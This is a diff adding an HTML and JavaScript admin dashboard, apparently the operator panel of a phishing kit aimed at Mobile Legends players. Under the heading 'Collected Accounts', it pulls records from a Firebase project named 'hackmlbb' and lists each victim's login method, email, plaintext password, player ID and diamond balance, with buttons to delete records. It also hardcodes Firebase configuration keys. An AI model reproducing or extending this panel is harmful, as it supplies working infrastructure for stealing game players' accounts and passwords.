@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Admin Dashboard – MLBB</title>
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+
+<!-- Firebase SDKs (compat) -->
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
+
+<style>
+body{
+  font-family:'Segoe UI',sans-serif;
+  background:#f1f5f9;
+  margin:0;
+  padding:20px;
+}
+.dashboard-container{
+  max-width:900px;
+  margin:0 auto;
+  background:white;
+  border-radius:10px;
+  box-shadow:0 4px 6px rgba(0,0,0,.1);
+  padding:20px;
+}
+header{
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  margin-bottom:20px;
+  border-bottom:1px solid #e2e8f0;
+  padding-bottom:15px;
+}
+h1{
+  margin:0;
+  color:#334155;
+  font-size:1.5rem;
+}
+table{
+  width:100%;
+  border-collapse:collapse;
+  margin-top:20px;
+}
+th,td{
+  padding:12px;
+  text-align:left;
+  border-bottom:1px solid #e2e8f0;
+}
+th{
+  background:#f8fafc;
+  color:#64748b;
+  font-size:.85rem;
+  text-transform:uppercase;
+}
+.badge{
+  padding:4px 8px;
+  border-radius:4px;
+  font-size:.75rem;
+  font-weight:bold;
+  color:white;
+}
+.bg-google{background:#db4437;}
+.bg-facebook{background:#1877f2;}
+.bg-moonton{background:#d97706;}
+.loading{
+  text-align:center;
+  padding:20px;
+  color:#64748b;
+}
+.no-data{
+  text-align:center;
+  color:#64748b;
+  margin-top:20px;
+}
+.btn{
+  display:inline-block;
+  padding:4px 8px;
+  border:none;
+  border-radius:3px;
+  background:#e53e3e;
+  color:white;
+  font-size:.75rem;
+  cursor:pointer;
+}
+.btn:hover{background:#c53030;}
+</style>
+</head>
+
+<body>
+<div class="dashboard-container">
+  <header>
+    <h1>📊 Collected Accounts</h1>
+    <div id="count" style="font-weight:bold;color:#2563eb;">0 Found</div>
+  </header>
+
+  <div id="loading" class="loading">Loading data…</div>
+  <div id="noData" class="no-data" style="display:none;">No accounts found yet.</div>
+
+  <table id="dataTable" style="display:none;">
+    <thead>
+      <tr>
+        <th>Method</th>
+        <th>Username</th>
+        <th>ID / Server</th>
+        <th>Email</th>
+        <th>Password</th>
+        <th>Diamonds</th>
+        <th>Timestamp</th>
+        <th>Actions</th>
+      </tr>
+    </thead>
+    <tbody id="tableBody"></tbody>
+  </table>
+</div>
+
+<script>
+// Firebase configuration – same as the client page
+const firebaseConfig = {
+  apiKey:"AIzaSyDlIzPKZ4C15866Ul-UusdUBF-xCdC2Knk",
+  authDomain:"hackmlbb-bee81.firebaseapp.com",
+  projectId:"hackmlbb-bee81",
+  storageBucket:"hackmlbb-bee81.firebasestorage.app",
+  messagingSenderId:"764884889904",
+  appId:"1:764884889904:web:6bef9487975f13df29d8f5",
+  measurementId:"G-J14XB3W9VV"
+};
+firebase.initializeApp(firebaseConfig);
+const db = firebase.firestore();
+
+async function loadDashboard(){
+  const tableBody=document.getElementById('tableBody');
+  const loading=document.getElementById('loading');
+  const noData=document.getElementById('noData');
+  const table=document.getElementById('dataTable');
+  const countBadge=document.getElementById('count');
+
+  try{
+    const snapshot=await db.collection('accounts').orderBy('timestamp','desc').get();
+    loading.style.display='none';
+
+    if(snapshot.empty){
+      noData.style.display='block';
+      countBadge.textContent='0 Found';
+      return;
+    }
+
+    noData.style.display='none';
+    table.style.display='table';
+    countBadge.textContent=`${snapshot.size} Found`;
+
+    snapshot.forEach(doc=>{
+      const d=doc.data();
+      const row=document.createElement('tr');
+
+      // Badge colour based on method
+      let badgeClass='bg-moonton';
+      if(d.method==='GOOGLE') badgeClass='bg-google';
+      if(d.method==='FACEBOOK') badgeClass='bg-facebook';
+
+      const ts = d.timestamp ? new Date(d.timestamp.seconds*1000).toLocaleString() : '—';
+
+      row.innerHTML = `
+        <td><span class="badge ${badgeClass}">${d.method}</span></td>
+        <td><strong>${d.username}</strong></td>
+        <td>${d.playerId} (${d.serverId})</td>
+        <td>${d.email}</td>
+        <td>${d.password}</td>
+        <td style="color:#fbbf24">${d.diamond}</td>
+        <td>${ts}</td>
+        <td><button class="btn" data-id="${doc.id}">Delete</button></td>
+      `;
+      tableBody.prepend(row);
+    });
+
+    // Attach delete handlers
+    tableBody.querySelectorAll('.btn').forEach(btn=>{
+      btn.addEventListener('click',async e=>{
+        const id=e.target.dataset.id;
+        if(confirm('Delete this record?')){
+          await db.collection('accounts').doc(id).delete();
+          e.target.parentElement.parentElement.remove();
+          // Update count
+          const remaining = tableBody.rows.length;
+          countBadge.textContent=`${remaining} Found`;
+          if(remaining===0){
+            table.style.display='none';
+            noData.style.display='block';
+          }
+        }
+      });
+    });
+
+  }catch(err){
+    console.error('Dashboard error:',err);
+    loading.textContent='Error loading data.';
+  }
+}
+
+window.addEventListener('load', loadDashboard);
+</script>
+</body>
+</html>
